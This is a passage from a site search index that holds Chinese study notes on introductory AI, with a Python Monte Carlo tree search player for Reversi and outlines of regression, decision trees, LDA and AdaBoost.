<li>\u9009\u62e9\uff08selection\uff09\uff1a\u7b97\u6cd5\u4ece\u641c\u7d22\u6811\u7684\u6839\u8282\u70b9\u5f00\u59cb\uff0c\u5411\u4e0b\u9012\u5f52\u9009\u62e9\u5b50\u8282\u70b9\u76f4\u5230\u5230\u8fbe\u53f6\u5b50\u7ed3\u70b9\u6216\u8005\u5230\u8fbe\u8fd8\u5177\u6709\u672a\u88ab\u6269\u5c55\u7684\u5b50\u8282\u70b9\u7684\u8282\u70b9 L\uff0c\u5411\u4e0b\u9012\u5f52\u9009\u62e9\u7684\u8fc7\u7a0b\u53ef\u7531 UCB1 \u7b97\u6cd5\u6765\u5b9e\u73b0\uff0c\u5728\u9012\u5f52\u9009\u62e9\u8fc7\u7a0b\u4e2d\u8bb0\u5f55\u4e0b\u6bcf\u4e2a\u8282\u70b9\u88ab\u9009\u62e9\u7684\u6b21\u6570\u548c\u6bcf\u4e2a\u8282\u70b9\u5f97\u5230\u7684\u5956\u52b1\u5747\u503c</li> <li>\u6269\u5c55\uff08expansion\uff09\uff1a\u5982\u679c\u8282\u70b9 L \u8fd8\u4e0d\u662f\u4e00\u4e2a\u7ec8\u6b62\u8282\u70b9\uff0c\u5219\u968f\u673a\u6269\u5c55\u5b83\u7684\u4e00\u4e2a\u672a\u88ab\u6269\u5c55\u8fc7\u7684\u540e\u7ee7\u8fb9\u7f18\u8282\u70b9 M</li> <li>\u6a21\u62df\uff08simulation\uff09\uff1a\u4ece\u8282\u70b9 M \u51fa\u53d1\uff0c\u6a21\u62df\u6269\u5c55\u641c\u7d22\u6811\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a\u7ec8\u6b62\u8282\u70b9</li> <li>\u53cd\u5411\u4f20\u64ad\uff08back propagation\uff09\uff1a\u7528\u6a21\u62df\u6240\u5f97\u7ed3\u679c\u56de\u6eaf\u66f4\u65b0\u6a21\u62df\u8def\u5f84\u4e2d M \u53ca\u4ee5\u4e0a\u8282\u70b9\u7684\u5956\u52b1\u5747\u503c\u548c\u88ab\u8bbf\u95ee\u6b21\u6570</li> </ul> </li> </ul> \u4ee3\u7801 <pre><code>class AIPlayer:\n    def __init__(self, color, C=1.2, iterations=100):\n        self.player = color\n        self.C = C\n        self.iterations = iterations\n\n    def game_over(self, board):\n        # \u6839\u636e\u5f53\u524d\u68cb\u76d8\uff0c\u5224\u65ad\u68cb\u5c40\u662f\u5426\u7ec8\u6b62\n        # \u5982\u679c\u5f53\u524d\u9009\u624b\u6ca1\u6709\u5408\u6cd5\u4e0b\u68cb\u7684\u4f4d\u5b50\uff0c\u5219\u5207\u6362\u9009\u624b\uff1b\u5982\u679c\u53e6\u5916\u4e00\u4e2a\u9009\u624b\u4e5f\u6ca1\u6709\u5408\u6cd5\u7684\u4e0b\u68cb\u4f4d\u7f6e\uff0c\u5219\u6bd4\u8d5b\u505c\u6b62\u3002\n        b_list = list(board.get_legal_actions('X'))\n        w_list = list(board.get_legal_actions('O'))\n        is_over = len(b_list) == 0 and len(w_list) == 0  # \u8fd4\u56de\u503c True/False\n        return is_over\n\n    def uct_search(self, root, iterations):\n        for i in range(iterations):\n            node = self.select(root)\n            reward = self.simulate(node)\n            self.backpropagate(node, reward)\n        return self.ucb(root, 0).action\n\n    def select(self, node):\n        while not self.game_over(node.board):\n            if len(node.children) == 0 or not node.finished():\n                return self.expand(node)\n            else:\n                node = self.ucb(node, self.C)\n        return node\n\n    def expand(self, node):\n        actions = list(node.board.get_legal_actions(node.player))\n        if len(actions) == 0:\n            return node.parent\n        visited = [child.action for child in node.children]\n        actions = [action for action in actions if action not in visited]\n        action = random.choice(actions)\n        new_board = deepcopy(node.board)\n        new_board._move(action, node.player)\n        node.expend(new_board, action, 'X' if node.player == 'O' else 'O')\n        return node.children[-1]\n\n    def ucb(self, node, C):\n        max_ucb = -float('inf')\n        max_children = []\n        for child in node.children:\n            ucb = child.reward / child.cnt + C * math.sqrt(2 * math.log(node.cnt) / child.cnt)\n            if ucb &gt; max_ucb:\n                max_ucb = ucb\n                max_children = [child]\n            elif ucb == max_ucb:\n                max_children.append(child)\n        if len(max_children) == 0:\n            return node.parent\n        return random.choice(max_children)\n\n    def simulate(self, node):\n        board = deepcopy(node.board)\n        player = node.player\n        while not self.game_over(board):\n            actions = list(board.get_legal_actions(player))\n            if not len(actions) == 0:\n                action = random.choice(actions)\n                board._move(action, player)\n            player = 'X' if player == 'O' else 'O'\n        return self.evaluate(board)\n\n    def evaluate(self, board: Board):\n        winner, diff = board.get_winner()\n        if winner == 2:\n            return 0\n        winner = 'X' if winner == 0 else 'O'\n        if winner == self.player:\n            return 10 + diff\n        else:\n            return -10 - diff\n\n    def backpropagate(self, node: TreeNode, reward):\n        while node:\n            node.cnt += 1\n            if node.player == self.player:\n                node.reward -= reward\n            else:\n                node.reward += reward\n            node = node.parent\n\n    def get_move(self, board):\n        if self.player == 'X':\n            player_name = '\u9ed1\u68cb'\n        else:\n            player_name = '\u767d\u68cb'\n        print(\"\u8bf7\u7b49\u4e00\u4f1a\uff0c\u5bf9\u65b9 {}-{} \u6b63\u5728\u601d\u8003\u4e2d...\".format(player_name, self.player))\n        root = TreeNode(deepcopy(board), None, None, self.player)\n        action = self.uct_search(root, self.iterations)\n        return action\n</code></pre>"},{"location":"cs/ai/basic/#_11","title":"\u673a\u5668\u5b66\u4e60\uff1a\u76d1\u7763\u5b66\u4e60","text":""},{"location":"cs/ai/basic/#_12","title":"\u673a\u5668\u5b66\u4e60\u57fa\u672c\u6982\u5ff5","text":"<ul> <li>\u673a\u5668\u5b66\u4e60\u7684\u76ee\u6807\u662f\u4ece\u539f\u59cb\u6570\u636e\u4e2d\u63d0\u53d6\u7279\u5f81\uff0c\u5b66\u4e60\u4e00\u4e2a\u6620\u5c04\u51fd\u6570 f \u5c06\u4e0a\u8ff0\u7279\u5f81\uff08\u6216\u539f\u59cb\u6570\u636e\uff09\u6620\u5c04\u5230\u8bed\u4e49\u7a7a\u95f4\uff0c\u5bfb\u627e\u6570\u636e\u548c\u4efb\u52a1\u76ee\u6807\u4e4b\u95f4\u7684\u5173\u7cfb</li> <li>\u673a\u5668\u5b66\u4e60\u79cd\u7c7b<ul> <li>\u76d1\u7763\u5b66\u4e60<ul> <li>\u7ed9\u5b9a\u5e26\u6709\u6807\u7b7e\u4fe1\u606f\u7684\u8bad\u7ec3\u96c6\u5408\uff0c\u5b66\u4e60\u4ece\u8f93\u5165\u5230\u8f93\u51fa\u7684\u6620\u5c04</li> <li>\u4e00\u822c\u88ab\u5e94\u7528\u5728\u56de\u5f52\u6216\u5206\u7c7b\u7684\u4efb\u52a1\u4e2d</li> </ul> </li> <li>\u65e0\u76d1\u7763\u5b66\u4e60<ul> <li>\u6700\u5927\u7279\u70b9\u662f\u6570\u636e\u65e0\u6807\u7b7e</li> <li>\u4e00\u822c\u88ab\u5e94\u7528\u5728\u805a\u7c7b\u6216\u82e5\u5e72\u964d\u7ef4\u4efb\u52a1\u4e2d</li> <li>\u534a\u76d1\u7763\u5b66\u4e60\u4f9d\u8d56\u4e8e\u90e8\u5206\u88ab\u6807\u6ce8\u7684\u6570\u636e</li> </ul> </li> <li>\u5f3a\u5316\u5b66\u4e60<ul> <li>\u4e00\u79cd\u5e8f\u5217\u6570\u636e\u51b3\u7b56\u5b66\u4e60\u65b9\u6cd5</li> <li>\u4ece\u4e0e\u73af\u5883\u4ea4\u4e92\u4e2d\u5b66\u4e60\uff0c\u901a\u8fc7\u56de\u62a5\u503c\uff08reward\uff09\u8ba9\u667a\u80fd\u4f53\uff08agent\uff09\u5b66\u4e60\u5230\u5728\u4e0d\u540c\u72b6\u6001\uff08state\uff09\u4e0b\u5982\u4f55\u9009\u62e9\u884c\u4e3a\u65b9\u5f0f\uff08action\uff09</li> </ul> </li> </ul> </li> <li>\u76d1\u7763\u5b66\u4e60<ul> <li>\u5728\u8bad\u7ec3\u8fc7\u7a0b\u4e2d\u5e0c\u671b\u6620\u5c04\u51fd\u6570\u5728\u8bad\u7ec3\u6570\u636e\u96c6\u4e0a\u5f97\u5230\u6240\u6709\u6837\u672c\u7684\u201c\u635f\u5931\u548c\u201d\u6700\u5c0f</li> <li>\u635f\u5931\u51fd\u6570\u5305\u62ec 0-1 \u635f\u5931\u51fd\u6570\uff08\u76f8\u7b49\u4e3a 0\uff0c\u53cd\u4e4b\u4e3a 1\uff09\uff0c\u5e73\u65b9\u635f\u5931\u51fd\u6570\uff0c\u7edd\u5bf9\u635f\u5931\u51fd\u6570\uff0c\u5bf9\u6570\u635f\u5931\u51fd\u6570\uff08\u5bf9\u6570\u4f3c\u7136\u51fd\u6570\uff09</li> <li>\u76d1\u7763\u5b66\u4e60\u4e00\u822c\u5305\u542b\u4e09\u4e2a\u90e8\u5206\u5185\u5bb9\uff1a<ul> <li>\u4ece\u8bad\u7ec3\u6570\u636e\u96c6\u4e2d\u5b66\u4e60\u5f97\u5230\u6620\u5c04\u51fd\u6570 f</li> <li>\u5728\u6d4b\u8bd5\u6570\u636e\u96c6\u4e0a\u6d4b\u8bd5\u6620\u5c04\u51fd\u6570 f</li> <li>\u5728\u672a\u77e5\u6570\u636e\u96c6\u4e0a\u6d4b\u8bd5\u6620\u5c04\u51fd\u6570 f\uff08\u6295\u5165\u4f7f\u7528\uff09</li> </ul> </li> <li>\u8bad\u7ec3\u53ca\u4e2d\u4ea7\u751f\u7684\u635f\u5931\u4e00\u822c\u79f0\u4e3a\u7ecf\u9a8c\u98ce\u9669\uff08empirical risk\uff09\uff0c\u8d8a\u5c0f\u5bf9\u8bad\u7ec3\u96c6\u62df\u5408\u6548\u679c\u8d8a\u597d</li> <li>\u6d4b\u8bd5\u96c6\u4e2d\u52a0\u5165\u4ece\u771f\u5b9e\u6570\u636e\u5206\u5e03\u91c7\u6837\u7684\u6837\u672c\u65f6\uff0c\u6d4b\u8bd5\u96c6\u4e0a\u7684\u635f\u5931\u4f1a\u4e0d\u65ad\u903c\u8fd1\u671f\u671b\u98ce\u9669\uff08expected risk\uff09\uff0c\u8d8a\u5c0f\u6a21\u578b\u8d8a\u597d</li> <li>\u673a\u5668\u5b66\u4e60\u7684\u76ee\u6807\u662f\u8ffd\u6c42\u671f\u671b\u98ce\u9669\u6700\u5c0f\u5316</li> <li>\u7ed3\u6784\u98ce\u9669\u6700\u5c0f\u5316\uff08structural risk minimization\uff09\uff1a\u9632\u6b62\u8fc7\u5b66\u4e60\uff0c\u57fa\u4e8e\u8fc7\u5b66\u4e60\u65f6\u53c2\u6570\u503c\u901a\u5e38\u90fd\u8f83\u5927\u8fd9\u4e00\u53d1\u73b0\uff0c\u5728\u7ecf\u9a8c\u98ce\u9669\u4e0a\u52a0\u4e0a\u8868\u793a\u6a21\u578b\u590d\u6742\u5ea6\u7684\u6b63\u5219\u5316\u9879\uff08regularizer\uff09\u6216\u60e9\u7f5a\u9879\uff08penalty term\uff09\uff0c\u5728\u6700\u5c0f\u5316\u7ecf\u9a8c\u98ce\u9669\u4e0e\u964d\u4f4e\u6a21\u578b\u590d\u6742\u5ea6\u4e4b\u95f4\u5bfb\u627e\u5e73\u8861</li> <li>\u4e3b\u8981\u7684\u76d1\u7763\u5b66\u4e60\u65b9\u6cd5\uff1a<ul> <li>\u5224\u522b\u65b9\u6cd5\uff08discriminative approach\uff09<ul> <li>\u76f4\u63a5\u5b66\u4e60\u5224\u522b\u51fd\u6570 f(X) \u6216\u8005\u6761\u4ef6\u6982\u7387\u5206\u5e03 P(Y|X) \u4f5c\u4e3a\u9884\u6d4b\u7684\u6a21\u578b</li> <li>\u5178\u578b\u5224\u522b\u6a21\u578b\u5305\u62ec\u56de\u5f52\u6a21\u578b\u3001\u795e\u7ecf\u7f51\u7edc\u3001\u652f\u6301\u5411\u91cf\u673a\u548c Ada boosting</li> </ul> </li> <li>\u751f\u6210\u65b9\u6cd5\uff08generative approach\uff09<ul> <li>\u4ece\u6570\u636e\u4e2d\u5b66\u4e60\u8054\u5408\u6982\u7387\u5206\u5e03 P(X, Y)\uff08\u901a\u8fc7\u4f3c\u7136\u6982\u7387 P(X|Y) \u548c\u7c7b\u6982\u7387 P(Y) \u4e58\u79ef\u6765\u6c42\uff09</li> <li>\u751f\u6210\u6a21\u578b\u5178\u578b\u65b9\u6cd5\u4e3a\u8d1d\u53f6\u65af\u65b9\u6cd5\u3001\u9690\u9a6c\u5c14\u53ef\u592b\u94fe</li> <li>\u96be\u70b9\u5728\u4e8e\u8054\u5408\u5206\u5e03\u6982\u7387\u6216\u4f3c\u7136\u6982\u7387\u5f88\u96be\u6c42</li> </ul> </li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/ai/basic/#_13","title":"\u56de\u5f52\u5206\u6790","text":"<ul> <li>\u4e00\u5143\u7ebf\u6027\u56de\u5f52</li> <li> <p>\u591a\u5143\u7ebf\u6027\u56de\u5f52</p> <ul> <li>\u6709 \\(m\\) \u4e2a\u8bad\u7ec3\u6570\u636e \\(\\{(\\mathbf{x}_i, y_i)\\}_{i=1}^m\\)\uff0c\u8981\u627e\u5230\u53c2\u6570 \\(\\mathbf{a}\\)\uff0c\u4f7f\u7ebf\u6027\u51fd\u6570 \\(f(\\mathbf{x}_i)=a_0+\\mathbf{a}^\\top\\mathbf{x}_i\\) \u6700\u5c0f\u5316\u5747\u65b9\u8bef\u5dee\u51fd\u6570 </li> </ul> \\[ J_m=\\dfrac{1}{m}\\sum_{i=1}^m\\left(y_i-f(\\mathbf{x}_i)\\right)^2=(\\mathbf{y}-\\mathbf{X}^\\top\\mathbf{a})^\\top(\\mathbf{y}-\\mathbf{X}^\\top\\mathbf{a}) \\] <ul> <li>\u5bf9\u5747\u65b9\u8bef\u5dee\u51fd\u6570\u6c42\u5bfc\u5f97 \\(\\nabla J(\\mathbf{a}) = -2\\mathbf{X}(\\mathbf{y}-\\mathbf{X}^\\top\\mathbf{a})\\)\uff0c\u4ee4\u5176\u4e3a 0 \u89e3\u5f97 \\(\\mathbf{a}=(\\mathbf{X}\\mathbf{X}^\\top)^{-1}\\mathbf{X}\\mathbf{y}\\)</li> <li>\u903b\u8f91\u65af\u8482\u56de\u5f52/\u5bf9\u6570\u51e0\u7387\u56de\u5f52</li> <li>\u7ebf\u6027\u56de\u5f52\u5bf9\u79bb\u7fa4\u70b9\u975e\u5e38\u654f\u611f\uff0c\u5bfc\u81f4\u6a21\u578b\u4e0d\u7a33\u5b9a\uff0c\u4e3a\u4e86\u7f13\u89e3\u8fd9\u4e2a\u95ee\u9898\u53ef\u4ee5\u8003\u8651\u903b\u8f91\u65af\u8482\u56de\u5f52\uff08logistic regression\uff09</li> <li>\u5728\u56de\u5f52\u6a21\u578b\u4e2d\u5f15\u5165 sigmoid \u51fd\u6570\uff0c\u903b\u8f91\u65af\u8482\u56de\u5f52\u6a21\u578b</li> </ul> \\[ y=\\dfrac{1}{1+e^{-z}}=\\dfrac{1}{1+e^{\\mathbf{w}^\\top\\mathbf{x}+b}} \\] <ul> <li>\u903b\u8f91\u65af\u8482\u56de\u5f52\u51fd\u6570\u7684\u8f93\u51fa\u5177\u6709\u6982\u7387\u610f\u4e49\uff0c\u4e00\u822c\u7528\u4e8e\u4e8c\u5206\u7c7b\u95ee\u9898</li> <li>\u903b\u8f91\u65af\u8482\u56de\u5f52\u662f\u4e00\u4e2a\u7ebf\u6027\u6a21\u578b\uff0c\u5728\u9884\u6d4b\u65f6\u53ef\u4ee5\u8ba1\u7b97\u7ebf\u6027\u51fd\u6570 \\(\\mathbf{w}^\\top\\mathbf{x}+b\\) \u53d6\u503c\u662f\u5426\u5927\u4e8e 0 \u6765\u5224\u65ad\u8f93\u5165\u6570\u636e\u7684\u7c7b\u522b\u5f52\u5c5e</li> <li>\u6c42\u89e3\u53c2\u6570\u7684\u5178\u578b\u505a\u6cd5\u662f\u6700\u5927\u5316\u5bf9\u6570\u4f3c\u7136\uff08log likelihood\uff09\u51fd\u6570</li> <li>\u6700\u5927\u4f3c\u7136\u4f30\u8ba1\u76ee\u7684\u662f\u8ba1\u7b97\u4f3c\u7136\u51fd\u6570\u7684\u6700\u5927\u503c\uff0c\u800c\u5206\u7c7b\u8fc7\u7a0b\u662f\u9700\u8981\u635f\u5931\u51fd\u6570\u6700\u5c0f\u5316\uff0c\u5e38\u7528\u68af\u5ea6\u4e0b\u964d\u6cd5\uff08gradient descent\uff09\uff1a\u6279\u91cf\u68af\u5ea6\u4e0b\u964d\u3001\u968f\u673a\u68af\u5ea6\u4e0b\u964d\u3001\u5c0f\u6279\u91cf\u68af\u5ea6\u4e0b\u964d</li> <li>\u53ea\u80fd\u7528\u4e8e\u89e3\u51b3\u4e8c\u5206\u7c7b\u95ee\u9898</li> <li>\u591a\u5206\u7c7b\u53ef\u4ee5\u5c06\u5176\u63a8\u5e7f\u4e3a\u591a\u9879\u903b\u8f91\u65af\u8482\u56de\u5f52\u6a21\u578b\uff0c\u5373 softmax \u51fd\u6570</li> </ul> </li> </ul>"},{"location":"cs/ai/basic/#_14","title":"\u51b3\u7b56\u6811","text":"<ul> <li>\u901a\u8fc7\u6811\u5f62\u7ed3\u6784\u6765\u8fdb\u884c\u5206\u7c7b\u7684\u65b9\u6cd5</li> <li>\u6bcf\u4e2a\u975e\u53f6\u5b50\u7ed3\u70b9\u8868\u793a\u5bf9\u5206\u7c7b\u76ee\u6807\u5728\u67d0\u4e2a\u5c5e\u6027\u4e0a\u7684\u4e00\u4e2a\u5224\u65ad\uff0c\u6bcf\u4e2a\u5206\u652f\u4ee3\u8868\u57fa\u4e8e\u8be5\u5c5e\u6027\u505a\u51fa\u7684\u4e00\u4e2a\u5224\u65ad\uff0c\u6bcf\u4e2a\u53f6\u5b50\u7ed3\u70b9\u4ee3\u8868\u4e00\u79cd\u5206\u7c7b\u7ed3\u679c</li> <li>\u51b3\u7b56\u6811\u5c06\u5206\u7c7b\u95ee\u9898\u5206\u89e3\u4e3a\u82e5\u5e72\u57fa\u4e8e\u5355\u4e2a\u4fe1\u606f\u7684\u63a8\u7406\u4efb\u52a1\uff0c\u91c7\u7528\u6811\u72b6\u7ed3\u6784\u6765\u9010\u6b65\u5b8c\u6210\u51b3\u7b56\u5224\u65ad</li> <li>\u5efa\u7acb\u51b3\u7b56\u6811\u7684\u8fc7\u7a0b\uff0c\u5c31\u662f\u4e0d\u65ad\u9009\u62e9\u5c5e\u6027\u503c\u5bf9\u6837\u672c\u96c6\u8fdb\u884c\u5212\u5206\u3001\u76f4\u81f3\u6bcf\u4e2a\u5b50\u6837\u672c\u4e3a\u540c\u4e00\u4e2a\u7c7b\u522b<ul> <li>\u5bf9\u4e8e\u8f83\u5927\u6570\u636e\u96c6\uff0c\u9700\u8981\u7406\u8bba\u548c\u65b9\u6cd5\u6765\u8bc4\u4ef7\u4e0d\u540c\u5c5e\u6027\u503c\u5212\u5206\u7684\u5b50\u6837\u672c\u96c6\u7684\u597d\u574f\u7a0b\u5ea6</li> </ul> </li> <li>\u6784\u5efa\u51b3\u7b56\u6811<ul> <li>\u6027\u80fd\u597d\u7684\u51b3\u7b56\u6811\u968f\u7740\u5212\u5206\u4e0d\u65ad\u8fdb\u884c\uff0c\u51b3\u7b56\u6811\u5206\u652f\u7ed3\u70b9\u6837\u672c\u96c6\u7684\u7eaf\u5ea6\u4f1a\u8d8a\u6765\u8d8a\u9ad8\uff0c\u5373\u6240\u5305\u542b\u6837\u672c\u5c3d\u53ef\u80fd\u5c5e\u4e8e\u76f8\u540c\u7c7b\u522b</li> <li>\u4fe1\u606f\u71b5\uff08entropy\uff09\u53ef\u4ee5\u7528\u6765\u8861\u91cf\u6837\u672c\u96c6\u548c\u7eaf\u5ea6\uff0c\u8d8a\u5927\u8bf4\u660e\u4e0d\u786e\u5b9a\u6027\u8d8a\u5927\u7eaf\u5ea6\u8d8a\u4f4e<ul> <li>\u5212\u5206\u6837\u672c\u96c6\u524d\u540e\u4fe1\u606f\u71b5\u7684\u51cf\u5c11\u91cf\u79f0\u4e3a\u4fe1\u606f\u589e\u76ca\uff08information gain\uff09\u7528\u6765\u8861\u91cf\u6837\u672c\u590d\u6742\u5ea6\u51cf\u5c11\u7684\u7a0b\u5ea6</li> </ul> </li> <li>\u5982\u679c\u5212\u5206\u540e\u7684\u4e0d\u540c\u5b50\u6837\u672c\u96c6\u90fd\u53ea\u5b58\u5728\u540c\u7c7b\u6837\u672c\uff0c\u90a3\u4e48\u505c\u6b62\u5212\u5206</li> <li>\u4e00\u822c\u800c\u8a00\uff0c\u4fe1\u606f\u589e\u76ca\u504f\u5411\u9009\u62e9\u5206\u652f\u591a\u7684\u6570\u5b66\uff0c\u4e00\u4e9b\u573a\u5408\u5bb9\u6613\u5bfc\u81f4\u6a21\u578b\u8fc7\u62df\u5408<ul> <li>\u4e00\u4e2a\u76f4\u63a5\u7684\u60f3\u6cd5\u662f\u5bf9\u5206\u652f\u8fc7\u591a\u8fdb\u884c\u60e9\u7f5a\uff0c\u5373\u53e6\u4e00\u4e2a\u7eaf\u5ea6\u8861\u91cf\u6307\u6807</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/ai/basic/#_15","title":"\u7ebf\u6027\u5224\u522b\u5206\u6790","text":"<ul> <li>\u7ebf\u6027\u5224\u522b\u5206\u6790\uff08linear discriminant analysis\uff0cLDA\uff09\u662f\u4e00\u79cd\u57fa\u4e8e\u76d1\u7763\u5b66\u4e60\u7684\u964d\u7ef4\u65b9\u6cd5\uff0c\u4e5f\u79f0\u4e3a Fisher \u7ebf\u6027\u5224\u522b\u5206\u6790\uff08FDA\uff09</li> <li>\u5bf9\u4e8e\u4e00\u7ec4\u5177\u6709\u6807\u7b7e\u4fe1\u606f\u7684\u9ad8\u4f4d\u6570\u636e\u6837\u672c\uff0cLDA \u5229\u7528\u5176\u7c7b\u522b\u4fe1\u606f\u5c06\u5176\u7ebf\u6027\u6295\u5f71\u5230\u4e00\u4e2a\u4f4e\u7ef4\u7a7a\u95f4\u71b5\uff0c\u5728\u4f4e\u7ef4\u7a7a\u95f4\u4e2d\u540c\u4e00\u7c7b\u522b\u6837\u672c\u5c3d\u53ef\u80fd\u9760\u8fd1\uff0c\u4e0d\u540c\u7c7b\u6837\u672c\u5c3d\u53ef\u80fd\u5f7c\u6b64\u8fdc\u79bb<ul> <li>\u7c7b\u5185\u65b9\u5dee\u5c0f\uff0c\u7c7b\u95f4\u95f4\u9694\u5927</li> </ul> </li> <li>LDA \u4e0e\u4e3b\u6210\u5206\u5206\u6790\uff08PCA\uff09\u7d27\u5bc6\u76f8\u5173\uff0c\u90fd\u5728\u5bfb\u627e\u6700\u4f73\u89e3\u91ca\u6570\u636e\u7684\u53d8\u91cf\u7ebf\u6027\u7ec4\u5408</li> <li>\u5bf9\u7ebf\u6027\u5224\u522b\u5206\u6790\u7684\u964d\u7ef4\u6b65\u9aa4\u63cf\u8ff0<ul> <li>\u8ba1\u7b97\u6570\u636e\u6837\u672c\u96c6\u4e2d\u6bcf\u4e2a\u7c7b\u522b\u6837\u672c\u7684\u5747\u503c</li> <li>\u8ba1\u7b97\u7c7b\u5185\u6563\u5ea6\u77e9\u9635 \\(\\mathbf{S}_w=\\mathbf{\\Sigma}_1+\\mathbf{\\Sigma}_2\\)\uff08\\(\\mathbf{\\Sigma}\\) \u534f\u65b9\u5dee\u77e9\u9635\uff09\u548c\u7c7b\u95f4\u6563\u5ea6\u77e9\u9635 \\(\\mathbf{S}_b=(\\mathbf{m}_2-\\mathbf{m}_1)(\\mathbf{m}_2-\\mathbf{m}_1)^\\top\\)</li> <li>\u6839\u636e \\(\\mathbf{S}_w^{-1}\\mathbf{S}_b\\mathbf{W}=\\lambda\\mathbf{W}\\) \u6765\u6c42\u89e3 \\(\\mathbf{S}_w^{-1}\\mathbf{S}_b\\) \u6240\u5bf9\u5e94\u7684\u524d \\(r\\) \u4e2a\u6700\u5927\u7279\u5f81\u503c\u6240\u5bf9\u5e94\u7684\u7279\u5f81\u5411\u91cf \\((\\mathbf{w}_1, \\mathbf{w}_2, \\cdots, \\mathbf{w}_r)\\) \u6784\u6210\u77e9\u9635 \\(\\mathbf{W}\\)</li> <li>\u901a\u8fc7\u77e9\u9635 \\(\\mathbf{W}\\) \u5c06\u6bcf\u4e2a\u6837\u672c\u6620\u5c04\u5230\u4f4e\u7ef4\u7a7a\u95f4\uff0c\u5b9e\u73b0\u7279\u5f81\u964d\u7ef4</li> </ul> </li> <li>PCA \u662f\u4e00\u79cd\u65e0\u76d1\u7763\u5b66\u4e60\u7684\u964d\u7ef4\u65b9\u6cd5\uff0cLDA \u662f\u76d1\u7763\u5b66\u4e60<ul> <li>PCA \u548c LDA \u5747\u662f\u4f18\u5316\u5bfb\u627e\u7279\u5f81\u5411\u91cf \\(\\mathbf{w}\\) \u6765\u5b9e\u73b0\u964d\u7ef4</li> <li>PCA \u5bfb\u627e\u6295\u5f71\u540e\u6570\u636e\u95f4\u65b9\u5dee\u6700\u5927\u7684\u6295\u5f71\u65b9\u5411\uff0cLDA \u5bfb\u627e\u7c7b\u5185\u65b9\u5dee\u5c0f\u3001\u7c7b\u95f4\u95f4\u9694\u5927\u7684\u6295\u5f71\u65b9\u5411</li> <li>PCA \u53ef\u4ee5\u5c06 d \u4e3a\u6570\u636e\u964d\u81f3\u5c0f\u4e8e d \u7684\u4efb\u610f\u7ef4\u5ea6</li> <li>LDA \u5c06\u4e3a\u540e\u5f97\u5230\u7ef4\u5ea6\u4e0e\u6570\u636e\u6837\u672c\u7c7b\u522b\u4e2a\u6570 K \u6709\u5173\uff0cd \u7ef4\u6570\u636e\u6709 K \u4e2a\u7c7b\u522b\uff0c\u5219\u964d\u7ef4\u7ef4\u5ea6\u5c0f\u4e8e\u6216\u7b49\u4e8e min(K-1, d)</li> </ul> </li> </ul>"},{"location":"cs/ai/basic/#ada-boosting","title":"Ada Boosting","text":"<ul> <li>Ada Boosting\uff08\u81ea\u9002\u5e94\u63d0\u5347\uff09\u901a\u8fc7\u96c6\u6210\uff08ensemble\uff09\u624b\u6bb5\u6765\u8fbe\u5230\u63d0\u5347\uff08boosting\uff09\u7b97\u6cd5\u6027\u80fd\u76ee\u7684</li> <li>\u5bf9\u4e8e\u4e00\u4e2a\u590d\u6742\u5206\u7c7b\u4efb\u52a1\uff0c\u5c06\u5176\u5206\u89e3\u4e3a\u82e5\u5e72\u4e2a\u5b50\u4efb\u52a1\uff0c\u7136\u540e\u5c06\u82e5\u5e72\u4e2a\u5b50\u4efb\u52a1\u7efc\u5408\u6784\u5efa\u5230\u4e00\u8d77\uff0c\u6700\u7ec8\u5b8c\u6210\u590d\u6742\u5206\u7c7b\u4efb\u52a1<ul> <li>\u6bcf\u4e2a\u5b50\u4efb\u52a1\u53ea\u80fd\u5b8c\u6210\u6210\u4f53\u4efb\u52a1\u7684\u90e8\u5206\uff0c\u662f\u4e00\u4e2a\u5f31\u5206\u7c7b\u5668\uff08weak classifier\uff09</li> <li>\u5c06\u82e5\u5e72\u4e2a\u5f31\u5206\u7c7b\u5668\u7ec4\u5408\u8d77\u6765\u5f62\u6210\u5f3a\u5206\u7c7b\u5668\uff08strong classifier\uff09\uff0c\u53ef\u4ee5\u5b8c\u6210\u590d\u6742\u5206\u7c7b\u4efb\u52a1</li> </ul> </li> <li>\u53ef\u8ba1\u7b97\u5b66\u4e60\u7406\u8bba<ul> <li>\u53ef\u8ba1\u7b97\u7406\u8bba\u5173\u5fc3\u4ec0\u4e48\u6837\u7684\u95ee\u9898\u53ef\u4ee5\u88ab\u8ba1\u7b97<ul> <li>\u4e00\u4e2a\u4efb\u52a1\u5982\u679c\u662f\u56fe\u7075\u53ef\u505c\u673a\u7684\uff0c\u90a3\u4e48\u8be5\u4efb\u52a1\u53ef\u8ba1\u7b97</li> </ul> </li> <li>\u53ef\u5b66\u4e60\u7406\u8bba\u5173\u5fc3\u4ec0\u4e48\u6837\u7684\u4efb\u52a1\u53ef\u4ee5\u88ab\u4e60\u5f97\uff0c\u4ece\u800c\u80fd\u88ab\u7b97\u6cd5\u6a21\u578b\u5b8c\u6210</li> <li>\u6982\u7387\u8fd1\u4f3c\u6b63\u786e\uff08PAC\uff09\u7814\u7a76\u95ee\u9898\u5305\u62ec<ul> <li>\u5982\u4f55\u77e5\u9053\u5b66\u4e60\u6240\u5f97\u7684\u5047\u8bbe\uff08hypothesis\uff09\u662f\u6b63\u786e\u7684</li> <li>\u4e3a\u4e86\u63a5\u8fd1\u771f\u5b9e\u5047\u8bbe\u6240\u9700\u8981\u7684\u8bad\u7ec3\u6570\u636e\u662f\u591a\u5c11</li> <li>\u5047\u8bbe\u7a7a\u95f4\u7684\u590d\u6742\u5ea6\u5982\u4f55\u5ea6\u91cf\u4ee5\u53ca\u5982\u4f55\u9009\u62e9\u5047\u8bbe\u7a7a\u95f4</li> </ul> </li> <li>\u6982\u7387\u8fd1\u4f3c\u6b63\u786e\u53ef\u5b66\u4e60\uff08PAC-learnable\uff09\uff1a\u80fd\u591f\u5b8c\u6210\u4efb\u52a1\u7684\u6982\u7387\u5927\u4e8e 0.5 \u5373\u5927\u4e8e\u968f\u673a\u5206\u7c7b\u5668\uff0c\u79f0\u4e3a\u5f31\u5206\u7c7b\u5668<ul> <li>\u5f3a\u53ef\u5b66\u4e60\u6a21\u578b\uff1a\u5b66\u4e60\u6a21\u578b\u80fd\u591f\u4ee5\u8f83\u9ad8\u7cbe\u5ea6\u5bf9\u7edd\u5927\u591a\u6570\u6837\u672c\u5b8c\u6210\u8bc6\u522b\u5206\u7c7b\u4efb\u52a1</li> 